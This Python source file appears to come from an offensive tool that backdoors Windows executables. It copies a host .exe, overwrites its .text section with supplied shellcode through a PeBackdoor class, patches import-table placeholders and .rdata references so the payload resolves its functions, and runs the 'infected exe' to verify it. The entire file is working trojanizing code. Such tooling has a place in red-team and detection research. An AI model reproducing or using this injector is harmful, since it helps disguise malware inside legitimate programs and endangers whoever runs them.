from helper import *
import shutil
import pprint
import logging
import time
import tempfile
import logging

from model.carrier import Carrier
from peparser.pehelper import *
from model.exehost import *
from observer import observer
from helper import rbrunmode_str
from derbackdoorer.derbackdoorer import PeBackdoor
from phases.datareuse import DataReuser


logger = logging.getLogger("Injector")


def inject_exe(
    shellcode_in: FilePath,
    exe_in: FilePath,
    exe_out: FilePath,
    inject_mode: int,
):
    logger.info("--[ Injecting: {} into: {} -> {} (mode: {})".format(
        shellcode_in, exe_in, exe_out, inject_mode
    ))
    logger.warn("---[ Inject mode: {}".format(rbrunmode_str(inject_mode)))

    # create copy of file exe_in to exe_out
    shutil.copyfile(exe_in, exe_out)
    
    # backdoor
    peinj = PeBackdoor()
    result = peinj.backdoor(
        1, # always overwrite .text section
        inject_mode, 
        shellcode_in, 
        exe_in, 
        exe_out
    )
    if not result:
        logging.error("Error: Redbackdoorer failed")
        raise Exception("Redbackdoorer failed")

    # verify and log
    shellcode = file_readall_binary(shellcode_in)
    shellcode_len = len(shellcode)
    code = extract_code_from_exe(exe_out)
    in_code = code[peinj.shellcodeOffsetRel:peinj.shellcodeOffsetRel+shellcode_len]
    jmp_code = code[peinj.backdoorOffsetRel:peinj.backdoorOffsetRel+12]
    if config.debug:
        observer.add_code("exe_extracted_loader", in_code)
        observer.add_code("exe_extracted_jmp", jmp_code)
    if in_code != shellcode:
        raise Exception("Shellcode injection error")


def injected_fix_iat(exe_out: FilePath, carrier: Carrier, exe_host: ExeHost):
    """replace IAT in shellcode in code and re-implant it"""

    # get code section of exe_out
    code = extract_code_from_exe(exe_out)

    for IatRequest in carrier.get_all_iat_requests():
        if not IatRequest.placeholder in code:
            raise Exception("IatResolve ID {} not found, abort".format(IatRequest.placeholder))
        addr = exe_host.get_addr_of_iat_function(IatRequest.name)
        if addr == None:
            raise Exception("IatResolve: Function {} not found".format(IatRequest.name))
        
        off = code.index(IatRequest.placeholder)
        current_address = off + exe_host.image_base + exe_host.code_virtaddr
        #current_address += 2
        destination_address = addr
        logger.info("    Replace at 0x{:x} with call to 0x{:x}".format(
            current_address, destination_address
        ))
        jmp = assemble_and_disassemble_jump(
            current_address, destination_address
        )
        code = code.replace(IatRequest.placeholder, jmp)

    # write back our patched code into the exe
    write_code_section(exe_file=exe_out, new_data=code)


def injected_fix_data(exe_path, carrier: Carrier, exe_host: ExeHost):
    data_reuser = DataReuser(exe_path)
    data_reuser.init()
    #ret = data_reuser.get_reloc_largest_gap(".rdata")
    #size = ret[0]
    #start = ret[1]
    #stop = ret[2]
    #print("GAP: {} {} {}".format(size, start, stop))
    #addr = start

    # Insert my data into the .rdata section
    sect = data_reuser.get_section_by_name(".rdata")
    addr = sect.raw_addr + 0x1AB0 #+ 0x1000
    #addr += 0x100
    #addr = 0
    print("Write into .data:".format())
    data_reuser.pe.close()

    reusedata_fixups: List[DataReuseEntry] = carrier.get_all_reusedata_fixups()

    with open(exe_path, "r+b") as f:
        for datareuse_fixup in reusedata_fixups:
            var_data = datareuse_fixup.data

            print("    Addr: {} / 0x{:X}  Data: {}".format(
                addr, addr, len(var_data)))

            # Overwrite data in the .rdata section with ours
            #data_reuser.pe.set_bytes_at_offset(addr, var_data)
            f.seek(addr)
            f.write(var_data)
            #f.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAA")
            print("ADD: 0x{:X} 0x{:X} 0x{:X}".format(addr, sect.virt_addr, exe_host.image_base))
            datareuse_fixup.addr = addr + sect.virt_addr + exe_host.image_base - sect.raw_addr
            addr += len(var_data) + 8
    #data_reuser.pe.write(exe_path + ".tmp")
    #data_reuser.pe.close()
    #shutil.move(exe_path + ".tmp", exe_path)

    # patch code section
    code = extract_code_from_exe(exe_path)
    for datareuse_fixup in reusedata_fixups:
        if not datareuse_fixup.randbytes in code:
            raise Exception("DataResuse: ID {} not found, abort".format(
                datareuse_fixup.randbytes))
        
        off = code.index(datareuse_fixup.randbytes)
        current_address = off + exe_host.image_base + exe_host.code_virtaddr
        destination_address = datareuse_fixup.addr
        logger.info("    Replace at 0x{:x} with call to 0x{:x}".format(
            current_address, destination_address
        ))
        lea = assemble_lea(
            current_address, destination_address, datareuse_fixup.register
        )
        code = code.replace(datareuse_fixup.randbytes, lea)

    # write back our patched code into the exe
    write_code_section(exe_file=exe_path, new_data=code)



def verify_injected_exe(exefile: FilePath) -> int:
    logger.info("---[ Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_process_checkret([
        exefile,
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(VerifyFilename)
        return 0
    else:
        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
        return 1

